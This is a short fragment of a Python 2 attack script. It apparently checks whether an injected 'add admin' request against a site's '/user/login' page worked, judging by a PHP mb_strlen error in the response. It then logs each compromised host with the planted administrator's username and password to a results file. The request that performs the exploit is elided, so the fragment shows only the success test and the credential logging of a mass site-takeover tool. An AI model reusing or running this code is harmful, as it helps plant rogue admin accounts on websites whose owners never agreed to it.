...
try:
    ...
    if "mb_strlen() expects parameter 1" in req.text:
        print '{}[>] {} {}   -  {}{} add admin    {}{} Success  '.format(sb, sd, target, fc,fc, sb,fg)
        open('Resultz/BruteForce.txt', 'a').write(str(target).split('/')[2] + '/user/login' + '\n' + 'username: ' + str(user) + '\n'+ 'password: ' + str(password) + '\n')
    else:
        print '{}[>] {} {}   -  {}{} add admin    {}{} Failed  '.format(sb, sd, target, fc,fc, sb,fr) 
except:
    print '{}[>] {} {}   -  {}{} add admin    {}{} Failed  '.format(sb, sd, target, fc,fc, sb,fr) 
